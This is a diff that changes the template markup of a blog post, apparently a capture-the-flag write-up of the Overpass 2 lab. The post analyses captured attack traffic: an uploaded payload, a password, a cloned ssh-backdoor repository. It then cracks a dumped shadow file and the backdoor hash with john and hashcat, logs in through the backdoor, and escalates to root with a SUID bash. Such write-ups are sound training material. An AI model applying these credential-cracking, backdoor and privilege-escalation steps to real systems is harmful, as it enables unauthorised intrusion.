@@ -44,8 +44,7 @@ Search through the traffic to identify the POST request that uploads the malicio
 <br />
 Right-click on the request and copy as ASCII text and paste it in a text editor.  I find it easier to read.
 
-{% raw %}
-```bash
+{% capture uploadpost %}
 )n)HE
 .@@VTvPr:
 '
@@ -72,8 +71,8 @@ Content-Disposition: form-data; name="submit"
 
 Upload File
 -----------------------------1809049028579987031515260006--
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=uploadpost %}
 
 <br />
 Look through the traffic to look for the traffic looking for the request that contains the password the attacker used to su into the james account.
@@ -87,12 +86,11 @@ Look through the traffic to look for the traffic looking for the request that co
 <br />
 Copy this as ASCII text if you find this helpful.
 
-{% raw %}
-```bash
+{% capture password %}
 )n)HEKwa@@Pg	anA
  5Q whenevernoteartinstant
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=password %}
 
 <br />
 Look through the traffic to find the request that clones the persistence repository.
@@ -103,12 +101,11 @@ Look through the traffic to find the request that clones the persistence reposit
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture clonerequest %}
 )n)HEhwu@@Pg1	a7*
 !5Qgit clone https://github.com/NinjaJc01/ssh-backdoor
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=clonerequest %}
 
 <br />
 Search through the traffic and find the request where the attacker reads the shadow file.
@@ -122,10 +119,12 @@ Search through the traffic and find the request where the attacker reads the sha
 <br />
 Save it to a file so we can feed it to a cracker.
 
-{% raw %}
-```bash
+{% capture catshadow %}
 ┌──(kali㉿kali)-[~/Documents/thm/overpass2]
-└─$ cat shadow    
+└─$ cat shadow
+{% endcapture %}
+
+{% capture shadow %}
 root:*:18295:0:99999:7:::
 daemon:*:18295:0:99999:7:::
 bin:*:18295:0:99999:7:::
@@ -160,14 +159,16 @@ paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDI
 szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
 bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
 muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catshadow %}
+
+{% include codebox.html title="shadow" content=shadow %}
 
 <br />
 Use john to crack the passwords in the shadow file.
 
-{% raw %}
-```bash
+{% capture johncrack %}
 ┌──(kali㉿kali)-[~/Documents/thm/overpass2]
 └─$ john --wordlist=/usr/share/wordlists/fasttrack.txt shadow                                                                                    
 Using default input encoding: UTF-8
@@ -182,8 +183,8 @@ secuirty3        (paradox)
 4g 0:00:00:00 DONE (2025-02-18 14:19) 19.04g/s 1247p/s 6238c/s 6238C/s Spring2017..starwars
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=johncrack %}
 
 <br />
 Check the repo for the ssh-backdoor.
@@ -222,18 +223,16 @@ Look through the traffic to get the hash value that the attacker used to set-up 
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture backdoorcommand %}
 )n)HEw@@Pg	az0
 Sj5R ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=backdoorcommand %}
 
 <br />
 Run hash-identifier to identify the type of hash.
 
-{% raw %}
-```bash
+{% capture hashidentifier %}
 ┌──(kali㉿kali)-[~]
 └─$ hash-identifier                                      
    #########################################################################
@@ -259,35 +258,38 @@ Least Possible Hashs:
 [+] SHA-512(HMAC)
 [+] Whirlpool(HMAC)
 --------------------------------------------------
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hashidentifier %}
 
 Create a file that contains the hash and salt, delimited by a colon.
 
-{% raw %}
-```bash
+{% capture cathashcat %}
 ┌──(kali㉿kali)-[~]
-└─$ cat hashcat                 
+└─$ cat hashcat   
+{% endcapture %}
+
+{% capture hashcat %}
 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=cathashcat %}
+
+{% include codebox.html title="hashcat" content=hashcat %}
 
 <br />
 Run hashcat to brute-force the attacker's hash.
 
-{% raw %}
-```bash
+{% capture hashcatbruteforce %}
 ┌──(kali㉿kali)-[~]
 └─$ hashcat -m 1710 -a 0 hashcat /usr/share/wordlists/rockyou.txt --quiet
 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hashcatbruteforce %}
 
 <br />
 Now, it is time to recover the machine.  Let's give nmap a run to see what services are running on the top ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/overpass2]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.144.138
 [sudo] password for kali: 
@@ -322,14 +324,13 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 53.95 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 SSH into the service running on port 2222.  You might have to specify the algorithm.
 
-{% raw %}
-```bash
+{% capture ssh2222 %}
 ┌──(kali㉿kali)-[~/Documents/thm/overpass2]
 └─$ ssh 10.10.195.179 -p 2222                 
 Unable to negotiate with 10.10.195.179 port 2222: no matching host key type found. Their offer: ssh-rsa
@@ -346,14 +347,13 @@ To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
 
 james@overpass-production:/home/james/ssh-backdoor$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ssh2222 %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 james@overpass-production:/home/james$ cat user.txt
 <redacted>
 james@overpass-production:/home/james$ ip a
@@ -369,14 +369,13 @@ james@overpass-production:/home/james$ ip a
        valid_lft 2935sec preferred_lft 2935sec
     inet6 fe80::cf:24ff:fe2c:ac63/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Check for potentially hidden files.  Notice the .suid_bash executable.  Try running it.  Why not?  What's the worst that could happen?
 
-{% raw %}
-```bash
+{% capture listfiles %}
 james@overpass-production:/home/james$ ls -la
 total 1136
 drwxr-xr-x 7 james james    4096 Jul 22  2020 .
@@ -396,18 +395,17 @@ drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
 drwxrwxr-x 7 james james    4096 Jul 21  2020 www
 james@overpass-production:/home/james$ /home/james/.suid_bash  
 .suid_bash-4.4$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=listfiles %}
 
 <br />
 Try to read the root.txt to test it.  Nope! Fail!
 
-{% raw %}
-```bash
+{% capture suidbash %}
 .suid_bash-4.4$ cat /root/root.txt
 cat: /root/root.txt: Permission denied
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=suidbash %}
 
 <br />
 Check the GTFO Bins for bash to see what else we can do.
@@ -422,21 +420,19 @@ Check the GTFO Bins for bash to see what else we can do.
 <br />
 Run suid_bash again with the -p option.
 
-{% raw %}
-```bash
+{% capture runitagain %}
 james@overpass-production:/home/james$ /home/james/.suid_bash -p
 .suid_bash-4.4# id
 uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
 .suid_bash-4.4# whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runitagain %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 .suid_bash-4.4# cat /root/root.txt
 <redacted>
 .suid_bash-4.4# ip a
@@ -452,8 +448,8 @@ Get the root.txt flag.
        valid_lft 3306sec preferred_lft 3306sec
     inet6 fe80::cf:24ff:fe2c:ac63/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 Thanks for giving this a read.  I will see you in the next one.
